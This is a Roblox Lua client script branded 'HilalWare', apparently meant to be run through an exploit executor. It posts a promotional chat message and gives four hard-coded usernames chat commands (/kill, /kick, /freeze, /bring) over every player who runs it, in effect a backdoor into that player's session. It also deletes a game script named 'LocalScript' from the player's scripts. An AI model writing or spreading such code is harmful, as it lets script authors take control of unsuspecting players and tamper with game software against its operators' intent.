-- v3


local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local TextChatService = game:GetService("TextChatService")

local message = "By HilalWare.Lua | Eski Sürüm → Yeni Sürüm"

local channel = TextChatService:FindFirstChild("TextChannels") and TextChatService.TextChannels:FindFirstChild("RBXGeneral")
if channel then
    channel:SendAsync(message)
else
    pcall(function()
        StarterGui:SetCore("ChatMakeSystemMessage", {
            Text = message,
            Color = Color3.fromRGB(255, 0, 0),
            Font = Enum.Font.GothamBold,
            TextSize = 18
        })
    end)
end


-- Admin kodu
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")

-- Yetkililer
local allowedUsers = {
    ["q692q"] = true,
    ["muhammet_bekir2004"] = true,
    ["HilalWare_Lua"] = true,
    ["Muhammet_bekir2003"] = true
}

local frozen = false

-- Yönetici etiketi
local function addAdminTag(player)
    local function onCharacterAdded(character)
        local head = character:WaitForChild("Head", 5)
        if head then
            local billboard = Instance.new("BillboardGui")
            billboard.Size = UDim2.new(0, 200, 0, 50)
            billboard.StudsOffset = Vector3.new(0, 2, 0)
            billboard.Adornee = head
            billboard.AlwaysOnTop = true
            billboard.Parent = head

            local textLabel = Instance.new("TextLabel")
            textLabel.Size = UDim2.new(1, 0, 1, 0)
            textLabel.BackgroundTransparency = 1
            textLabel.Text = "Yönetici"
            textLabel.TextStrokeTransparency = 0
            textLabel.TextScaled = true
            textLabel.Font = Enum.Font.GothamBold
            textLabel.Parent = billboard

            -- RGB animasyonu
            task.spawn(function()
                local hue = 0
                while textLabel.Parent do
                    hue = (hue + 1) % 360
                    textLabel.TextColor3 = Color3.fromHSV(hue / 360, 1, 1)
                    task.wait()
                end
            end)
        end
    end

    player.CharacterAdded:Connect(onCharacterAdded)
    if player.Character then
        onCharacterAdded(player.Character)
    end
end

-- Karakterin tüm parçalarını dondur / çöz
local function setAnchoredAllParts(char, anchored)
    for _, part in ipairs(char:GetDescendants()) do
        if part:IsA("BasePart") then
            part.Anchored = anchored
        end
    end
end

-- Komutlar
local function setupCommands(player)
    player.Chatted:Connect(function(message)
        message = string.lower(message)

        if message == "/kill" then
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                LocalPlayer.Character.Humanoid.Health = 0
            end

        elseif message == "/kick" then
            LocalPlayer:Kick("Yetkili tarafından oyundan atıldınız.")

        elseif message == "/freeze" then
            if LocalPlayer.Character then
                frozen = true
                setAnchoredAllParts(LocalPlayer.Character, true)
            end

        elseif message == "/unfreeze" then
            if LocalPlayer.Character then
                frozen = false
                setAnchoredAllParts(LocalPlayer.Character, false)
            end

        elseif message == "/bring" then
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
            end
        end
    end)
end

Players.PlayerAdded:Connect(function(player)
    if allowedUsers[player.Name] then
        addAdminTag(player)
        setupCommands(player)
    end
end)

for _, player in ipairs(Players:GetPlayers()) do
    if allowedUsers[player.Name] then
        addAdminTag(player)
        setupCommands(player)
    end
end

-- LocalScript silme
local player = game.Players.LocalPlayer
local targetScriptName = "LocalScript"

local targetScript = player:FindFirstChild("PlayerScripts") and player.PlayerScripts:FindFirstChild(targetScriptName)
if targetScript then
    targetScript:Destroy()
    print(targetScriptName .. " başarıyla silindi!")
else
    warn("Belirtilen LocalScript bulunamadı.")
end
